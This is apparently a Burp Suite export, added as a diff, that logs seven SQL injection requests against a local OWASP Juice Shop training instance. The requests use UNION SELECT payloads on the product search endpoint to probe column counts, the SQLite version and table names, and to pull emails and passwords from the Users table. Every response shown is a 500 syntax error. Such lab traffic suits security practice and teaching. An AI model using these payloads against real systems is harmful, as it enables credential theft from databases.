@@ -1,0 +1,685 @@
+<?xml version="1.1"?>
+<!-- NOTE: Any NULL bytes in requests and responses are preserved within this output, even though this strictly breaks the XML syntax. If your XML parser rejects the NULL bytes then you will need to remove or replace these bytes before parsing. Alternatively, you can use the option to base64-encode requests and responses. -->
+<!DOCTYPE items [
+<!ELEMENT items (item*)>
+<!ATTLIST items burpVersion CDATA "">
+<!ATTLIST items exportTime CDATA "">
+<!ELEMENT item (time, url, host, port, protocol, method, path, extension, request, status, responselength, mimetype, response, comment)>
+<!ELEMENT time (#PCDATA)>
+<!ELEMENT url (#PCDATA)>
+<!ELEMENT host (#PCDATA)>
+<!ATTLIST host ip CDATA "">
+<!ELEMENT port (#PCDATA)>
+<!ELEMENT protocol (#PCDATA)>
+<!ELEMENT method (#PCDATA)>
+<!ELEMENT path (#PCDATA)>
+<!ELEMENT extension (#PCDATA)>
+<!ELEMENT request (#PCDATA)>
+<!ATTLIST request base64 (true|false) "false">
+<!ELEMENT status (#PCDATA)>
+<!ELEMENT responselength (#PCDATA)>
+<!ELEMENT mimetype (#PCDATA)>
+<!ELEMENT response (#PCDATA)>
+<!ATTLIST response base64 (true|false) "false">
+<!ELEMENT comment (#PCDATA)>
+]>
+<items burpVersion="2026.4.3" exportTime="Thu Jul 09 23:48:10 IST 2026">
+  <item>
+    <time>Thu Jul 09 23:46:55 IST 2026</time>
+    <url><![CDATA[http://localhost:3000/rest/products/search?q=%27%20UNION%20SELECT%20id%2Cemail%2Cpassword%2C4%2C5%2C6%2C7%2C8%2C9%2C10%20FROM%20Users--]]></url>
+    <host ip="127.0.0.1">localhost</host>
+    <port>3000</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/rest/products/search?q=%27%20UNION%20SELECT%20id%2Cemail%2Cpassword%2C4%2C5%2C6%2C7%2C8%2C9%2C10%20FROM%20Users--]]></path>
+    <extension>null</extension>
+    <request base64="false"><![CDATA[GET /rest/products/search?q=%27%20UNION%20SELECT%20id%2Cemail%2Cpassword%2C4%2C5%2C6%2C7%2C8%2C9%2C10%20FROM%20Users-- HTTP/1.1
+Host: localhost:3000
+sec-ch-ua-platform: "Windows"
+Accept-Language: en-US,en;q=0.9
+sec-ch-ua: "Not-A.Brand";v="24", "Chromium";v="146"
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
+sec-ch-ua-mobile: ?0
+Accept: */*
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://localhost:3000/
+Accept-Encoding: gzip, deflate, br
+Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=2PaW3mD5oBa7Mp6PLlyrQKw2zd52S77hJeGORx1Nkeb49VvJZq8gjnEXYZr3
+Connection: keep-alive
+
+]]></request>
+    <status>500</status>
+    <responselength>1337</responselength>
+    <mimetype>HTML</mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 500 Internal Server Error
+Access-Control-Allow-Origin: *
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Feature-Policy: payment 'self'
+X-Recruiting: /#/jobs
+Content-Type: text/html; charset=utf-8
+Vary: Accept-Encoding
+Date: Thu, 09 Jul 2026 18:16:56 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+Content-Length: 982
+
+<html>
+  <head>
+    <meta charset='utf-8'> 
+    <title>Error: SQLITE_ERROR: near &quot;UNION&quot;: syntax error</title>
+    <style>* {
+  margin: 0;
+  padding: 0;
+  outline: 0;
+}
+
+body {
+  padding: 80px 100px;
+  font: 13px "Helvetica Neue", "Lucida Grande", "Arial";
+  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));
+  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);
+  background-repeat: no-repeat;
+  color: #555;
+  -webkit-font-smoothing: antialiased;
+}
+h1, h2 {
+  font-size: 22px;
+  color: #343434;
+}
+h1 em, h2 em {
+  padding: 0 5px;
+  font-weight: normal;
+}
+h1 {
+  font-size: 60px;
+}
+h2 {
+  margin-top: 10px;
+}
+ul li {
+  list-style: none;
+}
+#stacktrace {
+  margin-left: 60px;
+}
+</style>
+  </head>
+  <body>
+    <div id="wrapper">
+      <h1>OWASP Juice Shop (Express ^4.22.1)</h1>
+      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;UNION&quot;: syntax error</h2>
+      <ul id="stacktrace"></ul>
+    </div>
+  </body>
+</html>
+]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Thu Jul 09 23:46:55 IST 2026</time>
+    <url><![CDATA[http://localhost:3000/rest/products/search?q=%27%20UNION%20SELECT%20username%2Cpassword%20FROM%20Users--]]></url>
+    <host ip="127.0.0.1">localhost</host>
+    <port>3000</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/rest/products/search?q=%27%20UNION%20SELECT%20username%2Cpassword%20FROM%20Users--]]></path>
+    <extension>null</extension>
+    <request base64="false"><![CDATA[GET /rest/products/search?q=%27%20UNION%20SELECT%20username%2Cpassword%20FROM%20Users-- HTTP/1.1
+Host: localhost:3000
+sec-ch-ua-platform: "Windows"
+Accept-Language: en-US,en;q=0.9
+sec-ch-ua: "Not-A.Brand";v="24", "Chromium";v="146"
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
+sec-ch-ua-mobile: ?0
+Accept: */*
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://localhost:3000/
+Accept-Encoding: gzip, deflate, br
+Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=2PaW3mD5oBa7Mp6PLlyrQKw2zd52S77hJeGORx1Nkeb49VvJZq8gjnEXYZr3
+Connection: keep-alive
+
+]]></request>
+    <status>500</status>
+    <responselength>1337</responselength>
+    <mimetype>HTML</mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 500 Internal Server Error
+Access-Control-Allow-Origin: *
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Feature-Policy: payment 'self'
+X-Recruiting: /#/jobs
+Content-Type: text/html; charset=utf-8
+Vary: Accept-Encoding
+Date: Thu, 09 Jul 2026 18:16:56 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+Content-Length: 982
+
+<html>
+  <head>
+    <meta charset='utf-8'> 
+    <title>Error: SQLITE_ERROR: near &quot;UNION&quot;: syntax error</title>
+    <style>* {
+  margin: 0;
+  padding: 0;
+  outline: 0;
+}
+
+body {
+  padding: 80px 100px;
+  font: 13px "Helvetica Neue", "Lucida Grande", "Arial";
+  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));
+  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);
+  background-repeat: no-repeat;
+  color: #555;
+  -webkit-font-smoothing: antialiased;
+}
+h1, h2 {
+  font-size: 22px;
+  color: #343434;
+}
+h1 em, h2 em {
+  padding: 0 5px;
+  font-weight: normal;
+}
+h1 {
+  font-size: 60px;
+}
+h2 {
+  margin-top: 10px;
+}
+ul li {
+  list-style: none;
+}
+#stacktrace {
+  margin-left: 60px;
+}
+</style>
+  </head>
+  <body>
+    <div id="wrapper">
+      <h1>OWASP Juice Shop (Express ^4.22.1)</h1>
+      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;UNION&quot;: syntax error</h2>
+      <ul id="stacktrace"></ul>
+    </div>
+  </body>
+</html>
+]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Thu Jul 09 23:46:55 IST 2026</time>
+    <url><![CDATA[http://localhost:3000/rest/products/search?q=%27%20UNION%20SELECT%20sqlite_version()%2C2%2C3%2C4%2C5--]]></url>
+    <host ip="127.0.0.1">localhost</host>
+    <port>3000</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/rest/products/search?q=%27%20UNION%20SELECT%20sqlite_version()%2C2%2C3%2C4%2C5--]]></path>
+    <extension>null</extension>
+    <request base64="false"><![CDATA[GET /rest/products/search?q=%27%20UNION%20SELECT%20sqlite_version()%2C2%2C3%2C4%2C5-- HTTP/1.1
+Host: localhost:3000
+sec-ch-ua-platform: "Windows"
+Accept-Language: en-US,en;q=0.9
+sec-ch-ua: "Not-A.Brand";v="24", "Chromium";v="146"
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
+sec-ch-ua-mobile: ?0
+Accept: */*
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://localhost:3000/
+Accept-Encoding: gzip, deflate, br
+Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=2PaW3mD5oBa7Mp6PLlyrQKw2zd52S77hJeGORx1Nkeb49VvJZq8gjnEXYZr3
+Connection: keep-alive
+
+]]></request>
+    <status>500</status>
+    <responselength>1337</responselength>
+    <mimetype>HTML</mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 500 Internal Server Error
+Access-Control-Allow-Origin: *
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Feature-Policy: payment 'self'
+X-Recruiting: /#/jobs
+Content-Type: text/html; charset=utf-8
+Vary: Accept-Encoding
+Date: Thu, 09 Jul 2026 18:16:56 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+Content-Length: 982
+
+<html>
+  <head>
+    <meta charset='utf-8'> 
+    <title>Error: SQLITE_ERROR: near &quot;UNION&quot;: syntax error</title>
+    <style>* {
+  margin: 0;
+  padding: 0;
+  outline: 0;
+}
+
+body {
+  padding: 80px 100px;
+  font: 13px "Helvetica Neue", "Lucida Grande", "Arial";
+  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));
+  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);
+  background-repeat: no-repeat;
+  color: #555;
+  -webkit-font-smoothing: antialiased;
+}
+h1, h2 {
+  font-size: 22px;
+  color: #343434;
+}
+h1 em, h2 em {
+  padding: 0 5px;
+  font-weight: normal;
+}
+h1 {
+  font-size: 60px;
+}
+h2 {
+  margin-top: 10px;
+}
+ul li {
+  list-style: none;
+}
+#stacktrace {
+  margin-left: 60px;
+}
+</style>
+  </head>
+  <body>
+    <div id="wrapper">
+      <h1>OWASP Juice Shop (Express ^4.22.1)</h1>
+      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;UNION&quot;: syntax error</h2>
+      <ul id="stacktrace"></ul>
+    </div>
+  </body>
+</html>
+]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Thu Jul 09 23:46:55 IST 2026</time>
+    <url><![CDATA[http://localhost:3000/rest/products/search?q=%27%20UNION%20SELECT%201%2C2%2C3%2C4%2C5--]]></url>
+    <host ip="127.0.0.1">localhost</host>
+    <port>3000</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/rest/products/search?q=%27%20UNION%20SELECT%201%2C2%2C3%2C4%2C5--]]></path>
+    <extension>null</extension>
+    <request base64="false"><![CDATA[GET /rest/products/search?q=%27%20UNION%20SELECT%201%2C2%2C3%2C4%2C5-- HTTP/1.1
+Host: localhost:3000
+sec-ch-ua-platform: "Windows"
+Accept-Language: en-US,en;q=0.9
+sec-ch-ua: "Not-A.Brand";v="24", "Chromium";v="146"
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
+sec-ch-ua-mobile: ?0
+Accept: */*
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://localhost:3000/
+Accept-Encoding: gzip, deflate, br
+Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=2PaW3mD5oBa7Mp6PLlyrQKw2zd52S77hJeGORx1Nkeb49VvJZq8gjnEXYZr3
+Connection: keep-alive
+
+]]></request>
+    <status>500</status>
+    <responselength>1337</responselength>
+    <mimetype>HTML</mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 500 Internal Server Error
+Access-Control-Allow-Origin: *
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Feature-Policy: payment 'self'
+X-Recruiting: /#/jobs
+Content-Type: text/html; charset=utf-8
+Vary: Accept-Encoding
+Date: Thu, 09 Jul 2026 18:16:56 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+Content-Length: 982
+
+<html>
+  <head>
+    <meta charset='utf-8'> 
+    <title>Error: SQLITE_ERROR: near &quot;UNION&quot;: syntax error</title>
+    <style>* {
+  margin: 0;
+  padding: 0;
+  outline: 0;
+}
+
+body {
+  padding: 80px 100px;
+  font: 13px "Helvetica Neue", "Lucida Grande", "Arial";
+  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));
+  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);
+  background-repeat: no-repeat;
+  color: #555;
+  -webkit-font-smoothing: antialiased;
+}
+h1, h2 {
+  font-size: 22px;
+  color: #343434;
+}
+h1 em, h2 em {
+  padding: 0 5px;
+  font-weight: normal;
+}
+h1 {
+  font-size: 60px;
+}
+h2 {
+  margin-top: 10px;
+}
+ul li {
+  list-style: none;
+}
+#stacktrace {
+  margin-left: 60px;
+}
+</style>
+  </head>
+  <body>
+    <div id="wrapper">
+      <h1>OWASP Juice Shop (Express ^4.22.1)</h1>
+      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;UNION&quot;: syntax error</h2>
+      <ul id="stacktrace"></ul>
+    </div>
+  </body>
+</html>
+]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Thu Jul 09 23:46:55 IST 2026</time>
+    <url><![CDATA[http://localhost:3000/rest/products/search?q=%27%20AND%201%3D2%20UNION%20SELECT%201%2C2%2C3%2C4%2C5--]]></url>
+    <host ip="127.0.0.1">localhost</host>
+    <port>3000</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/rest/products/search?q=%27%20AND%201%3D2%20UNION%20SELECT%201%2C2%2C3%2C4%2C5--]]></path>
+    <extension>null</extension>
+    <request base64="false"><![CDATA[GET /rest/products/search?q=%27%20AND%201%3D2%20UNION%20SELECT%201%2C2%2C3%2C4%2C5-- HTTP/1.1
+Host: localhost:3000
+sec-ch-ua-platform: "Windows"
+Accept-Language: en-US,en;q=0.9
+sec-ch-ua: "Not-A.Brand";v="24", "Chromium";v="146"
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
+sec-ch-ua-mobile: ?0
+Accept: */*
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://localhost:3000/
+Accept-Encoding: gzip, deflate, br
+Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=2PaW3mD5oBa7Mp6PLlyrQKw2zd52S77hJeGORx1Nkeb49VvJZq8gjnEXYZr3
+Connection: keep-alive
+
+]]></request>
+    <status>500</status>
+    <responselength>1337</responselength>
+    <mimetype>HTML</mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 500 Internal Server Error
+Access-Control-Allow-Origin: *
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Feature-Policy: payment 'self'
+X-Recruiting: /#/jobs
+Content-Type: text/html; charset=utf-8
+Vary: Accept-Encoding
+Date: Thu, 09 Jul 2026 18:16:56 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+Content-Length: 982
+
+<html>
+  <head>
+    <meta charset='utf-8'> 
+    <title>Error: SQLITE_ERROR: near &quot;UNION&quot;: syntax error</title>
+    <style>* {
+  margin: 0;
+  padding: 0;
+  outline: 0;
+}
+
+body {
+  padding: 80px 100px;
+  font: 13px "Helvetica Neue", "Lucida Grande", "Arial";
+  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));
+  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);
+  background-repeat: no-repeat;
+  color: #555;
+  -webkit-font-smoothing: antialiased;
+}
+h1, h2 {
+  font-size: 22px;
+  color: #343434;
+}
+h1 em, h2 em {
+  padding: 0 5px;
+  font-weight: normal;
+}
+h1 {
+  font-size: 60px;
+}
+h2 {
+  margin-top: 10px;
+}
+ul li {
+  list-style: none;
+}
+#stacktrace {
+  margin-left: 60px;
+}
+</style>
+  </head>
+  <body>
+    <div id="wrapper">
+      <h1>OWASP Juice Shop (Express ^4.22.1)</h1>
+      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;UNION&quot;: syntax error</h2>
+      <ul id="stacktrace"></ul>
+    </div>
+  </body>
+</html>
+]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Thu Jul 09 23:46:55 IST 2026</time>
+    <url><![CDATA[http://localhost:3000/rest/products/search?q=%27%20UNION%20SELECT%20tbl_name%20FROM%20sqlite_master%20WHERE%20type%3D%27table%27--]]></url>
+    <host ip="127.0.0.1">localhost</host>
+    <port>3000</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/rest/products/search?q=%27%20UNION%20SELECT%20tbl_name%20FROM%20sqlite_master%20WHERE%20type%3D%27table%27--]]></path>
+    <extension>null</extension>
+    <request base64="false"><![CDATA[GET /rest/products/search?q=%27%20UNION%20SELECT%20tbl_name%20FROM%20sqlite_master%20WHERE%20type%3D%27table%27-- HTTP/1.1
+Host: localhost:3000
+sec-ch-ua-platform: "Windows"
+Accept-Language: en-US,en;q=0.9
+sec-ch-ua: "Not-A.Brand";v="24", "Chromium";v="146"
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
+sec-ch-ua-mobile: ?0
+Accept: */*
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://localhost:3000/
+Accept-Encoding: gzip, deflate, br
+Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=2PaW3mD5oBa7Mp6PLlyrQKw2zd52S77hJeGORx1Nkeb49VvJZq8gjnEXYZr3
+Connection: keep-alive
+
+]]></request>
+    <status>500</status>
+    <responselength>1337</responselength>
+    <mimetype>HTML</mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 500 Internal Server Error
+Access-Control-Allow-Origin: *
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Feature-Policy: payment 'self'
+X-Recruiting: /#/jobs
+Content-Type: text/html; charset=utf-8
+Vary: Accept-Encoding
+Date: Thu, 09 Jul 2026 18:16:56 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+Content-Length: 982
+
+<html>
+  <head>
+    <meta charset='utf-8'> 
+    <title>Error: SQLITE_ERROR: near &quot;UNION&quot;: syntax error</title>
+    <style>* {
+  margin: 0;
+  padding: 0;
+  outline: 0;
+}
+
+body {
+  padding: 80px 100px;
+  font: 13px "Helvetica Neue", "Lucida Grande", "Arial";
+  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));
+  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);
+  background-repeat: no-repeat;
+  color: #555;
+  -webkit-font-smoothing: antialiased;
+}
+h1, h2 {
+  font-size: 22px;
+  color: #343434;
+}
+h1 em, h2 em {
+  padding: 0 5px;
+  font-weight: normal;
+}
+h1 {
+  font-size: 60px;
+}
+h2 {
+  margin-top: 10px;
+}
+ul li {
+  list-style: none;
+}
+#stacktrace {
+  margin-left: 60px;
+}
+</style>
+  </head>
+  <body>
+    <div id="wrapper">
+      <h1>OWASP Juice Shop (Express ^4.22.1)</h1>
+      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;UNION&quot;: syntax error</h2>
+      <ul id="stacktrace"></ul>
+    </div>
+  </body>
+</html>
+]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Thu Jul 09 23:46:56 IST 2026</time>
+    <url><![CDATA[http://localhost:3000/rest/products/search?q=%27%20UNION%20SELECT%201%2C2%2C3%2C4%2C5%20FROM%20Users--]]></url>
+    <host ip="127.0.0.1">localhost</host>
+    <port>3000</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/rest/products/search?q=%27%20UNION%20SELECT%201%2C2%2C3%2C4%2C5%20FROM%20Users--]]></path>
+    <extension>null</extension>
+    <request base64="false"><![CDATA[GET /rest/products/search?q=%27%20UNION%20SELECT%201%2C2%2C3%2C4%2C5%20FROM%20Users-- HTTP/1.1
+Host: localhost:3000
+sec-ch-ua-platform: "Windows"
+Accept-Language: en-US,en;q=0.9
+sec-ch-ua: "Not-A.Brand";v="24", "Chromium";v="146"
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
+sec-ch-ua-mobile: ?0
+Accept: */*
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://localhost:3000/
+Accept-Encoding: gzip, deflate, br
+Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=2PaW3mD5oBa7Mp6PLlyrQKw2zd52S77hJeGORx1Nkeb49VvJZq8gjnEXYZr3
+Connection: keep-alive
+
+]]></request>
+    <status>500</status>
+    <responselength>1337</responselength>
+    <mimetype>HTML</mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 500 Internal Server Error
+Access-Control-Allow-Origin: *
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Feature-Policy: payment 'self'
+X-Recruiting: /#/jobs
+Content-Type: text/html; charset=utf-8
+Vary: Accept-Encoding
+Date: Thu, 09 Jul 2026 18:16:56 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+Content-Length: 982
+
+<html>
+  <head>
+    <meta charset='utf-8'> 
+    <title>Error: SQLITE_ERROR: near &quot;UNION&quot;: syntax error</title>
+    <style>* {
+  margin: 0;
+  padding: 0;
+  outline: 0;
+}
+
+body {
+  padding: 80px 100px;
+  font: 13px "Helvetica Neue", "Lucida Grande", "Arial";
+  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));
+  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);
+  background-repeat: no-repeat;
+  color: #555;
+  -webkit-font-smoothing: antialiased;
+}
+h1, h2 {
+  font-size: 22px;
+  color: #343434;
+}
+h1 em, h2 em {
+  padding: 0 5px;
+  font-weight: normal;
+}
+h1 {
+  font-size: 60px;
+}
+h2 {
+  margin-top: 10px;
+}
+ul li {
+  list-style: none;
+}
+#stacktrace {
+  margin-left: 60px;
+}
+</style>
+  </head>
+  <body>
+    <div id="wrapper">
+      <h1>OWASP Juice Shop (Express ^4.22.1)</h1>
+      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;UNION&quot;: syntax error</h2>
+      <ul id="stacktrace"></ul>
+    </div>
+  </body>
+</html>
+]]></response>
+    <comment></comment>
+  </item>
+</items>
